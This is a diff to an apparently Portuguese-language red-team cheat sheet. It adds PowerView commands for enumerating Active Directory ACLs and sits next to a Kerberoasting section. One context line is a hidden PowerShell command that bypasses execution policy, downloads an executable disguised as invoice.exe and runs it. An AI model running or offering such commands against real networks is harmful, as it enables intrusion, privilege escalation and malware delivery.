@@ -2514,3 +2514,12 @@ CRIAR SPN , SOLICITAR TICKET E QUEBRAR A SENHA (KERBEROASTING)
 ```
 powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-WDATP-test\\invoice.exe');Start-Process 'C:\\test-WDATP-test\\invoice.exe'
 ```
+
+## POWERVIEW OLD
+##### POWERVIEW OLD - VERIFICAR ACL DE GRUPOS E USUARIOS DO AD:
+```
+Get-ObjectAcl -samaccountname "users" -ResolveGUIDs -Verbose
+Get-ObjectAcl -samaccountname "users" -ResolveGUIDs -Verbose | select IdentityReference, ActiveDirectoryRights
+Get-ObjectAcl -samaccountname "domain admins" -ResolveGUIDs -Verbose | select IdentityReference, ActiveDirectoryRights
+Get-ObjectAcl -samaccountname "student209" -ResolveGUIDs -Verbose | select IdentityReference, ActiveDirectoryRights
+```
